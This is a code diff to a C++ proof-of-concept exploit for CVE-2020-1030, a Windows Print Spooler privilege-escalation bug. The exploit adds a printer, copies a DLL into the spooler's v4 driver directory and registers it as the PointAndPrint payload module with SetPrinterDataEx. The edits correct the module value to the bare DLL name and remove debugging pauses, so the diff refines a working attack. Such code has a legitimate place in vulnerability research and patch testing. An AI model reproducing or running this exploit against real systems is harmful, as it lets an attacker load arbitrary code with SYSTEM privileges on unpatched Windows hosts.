@@ -54,14 +54,15 @@ void cve_2020_1030(int argc, wchar_t* argv[]) {
 	if (hasBeenRestarted) {
 		// check if v4 driver directory has been correctly created 
 		if (!doesDirExists(v4DriverDir)) {
-			cout << "[-] v4 not created" << endl; 
+			cout << "[-] v4 directory not created" << endl; 
 			return; 
 		}
 		cout << "[+] v4 directory successfully created" << endl; 
 
 		// move cve_2020_1030.dll inside that directory 
 		wchar_t* oldDLLPath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\PointAndPrint.dll"),
-			* newDLLPath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll");
+			* newDLLPath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
+			*dllName = const_cast<wchar_t*>(L"cve_2020_1030.dll");
 
 		if (!CopyFile(oldDLLPath, newDLLPath, FALSE)) {
 			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
@@ -70,8 +71,8 @@ void cve_2020_1030(int argc, wchar_t* argv[]) {
 		cout << "[+] DLL correctly copied inside v4 directory" << endl;
 
 		// set the cve_2020_1030.dll as PointAndPrint DLL 	
-		cbData = ((DWORD)wcslen(newDLLPath) + 1) * sizeof(WCHAR);
-		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)newDLLPath, cbData);
+		cbData = ((DWORD)wcslen(dllName) + 1) * sizeof(WCHAR);
+		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)dllName, cbData);
 
 		if (dwStatus != ERROR_SUCCESS) {
 			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
@@ -94,7 +95,6 @@ void cve_2020_1030(int argc, wchar_t* argv[]) {
 	}
 
 	ClosePrinter(hPrinter);
-	system("pause");
 }
 
 // int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
@@ -107,9 +107,7 @@ int main(int argc, wchar_t* argv[]) {
 
 	// printer settings
 	HRESULT driverResult = AddDriver(driverName);
-	system("pause"); 
 	DWORD portResult = AddPort(portName);
-	system("pause");
 
 	HANDLE printerHandler = AddPrinter(printerName, driverName, portName);
 	ClosePrinter(printerHandler); 
